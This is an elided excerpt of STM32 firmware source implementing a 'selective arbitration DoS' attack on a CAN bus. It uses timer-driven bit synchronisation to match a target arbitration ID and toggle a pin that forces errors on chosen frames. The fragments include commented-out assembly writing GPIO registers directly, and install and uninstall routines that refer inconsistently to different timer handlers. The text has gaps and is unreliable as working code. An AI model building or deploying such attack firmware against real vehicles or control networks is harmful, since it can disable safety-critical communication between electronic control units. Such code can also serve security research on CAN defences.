...
void (*timer2_callback_handler)(void) = NULL;//dedicated timer for selective_arbitration_dos attack (5)
...
static uint8_t targetBit=0;//targetBit, matchedBits, and bitsToTargetBit are used by selective_arbitration_dos attack
...
void EXTI15_10_IRQHandler(void)
{
    ...
    matchedBits =0;//used for selective_arbitration_dos
    arbid_found =0;//used for selective_arbitration_dos
    ...
    TIM3->ARR = can_ticks_per_cycle/2;
    TIM3->CNT = 0;
    TIM3->DIER |= TIM_IT_UPDATE;
    TIM3->CR1 |= TIM_CR1_CEN;
    ...
    TIM2->ARR = can_ticks_per_cycle - can_edge_interrupt_delay - can_edge_interrupt_delay;
    TIM2->CNT = 0;
    TIM2->DIER |= TIM_IT_UPDATE;
    TIM2->CR1 |= TIM_CR1_CEN;
...
{
  GPIOA->ODR ^= GPIO_PIN_4;
  uint16_t currentBitCount=0;
  if ((bits_read>=2 && bits_read <=9) && (((attack_arbid>>(12-bits_read)&1) == last_bit)))
  {
    GPIOA->ODR ^= GPIO_PIN_4;
    matchedBits++;
    currentBitCount=bits_read;
    while (currentBitCount==bits_read) {
      GPIOA->ODR ^= GPIO_PIN_15;
    }
    /*__asm(
      "add  r0, r0, #1\n"//increment by 1 for every matched bit
      "ldr  r1,=#10\n"//8: bitsToTargetBit -1 ==> the last dominant bit before the target recessive bit
      "cmp  r0, r1\n"
      "bne  endif\n"
      "then:    ldr  r0,=0x58020414\n"
                "ldrh  r1, [r0]\n"
                "eor r1,r1,0x2000\n"
                "strh r1,[r0]\n"
      "endif:\n"
    ...
    if(matchedBits == bitsToTargetBit-1)//means the next bit is the targetBit. (-1 because we read bits from bits_read: 2)
    {
      //GPIOA->ODR ^= GPIO_PIN_15;
      //GPIOB->ODR &= ~GPIO_PIN_13;
      // GPIOB: 0x58020400 + 0x14 offset = 0x58020414 ==> pin 13 ==> 0x2000
      //GPIOA: 0x58020000  + 0x14 offset = 0x58020014, pin 4 ==> 0x0010, 15 ==> 0x8000
      //GPIOB->ODR &= ~GPIO_PIN_13;
      /*Clear pin <==> GPIOB->ODR &= ~GPIO_PIN_13;
      __asm(
        "ldr  r0,=0x58020414\n"
        "ldr  r1, [r0]\n"
        "bic r1,r1,0x2000\n"
      ...
      */
      /*Toggle pin <==> GPIOA->ODR ^= GPIO_PIN_15
      __asm(
      "ldr  r0,=0x58020014\n"
      "ldrh  r1, [r0]\n"
      "eor r1,r1,0x8000\n"
...
void install_selective_arbitration_dos()
{
  ...
  //timer2_callback_handler = selective_arbitration_dos;
}
void uninstall_selective_arbitration_dos()
{
  timer3_callback_handler = NULL;
}
...
void remove_attack()
{
    ...
    uninstall_selective_arbitration_dos();
}
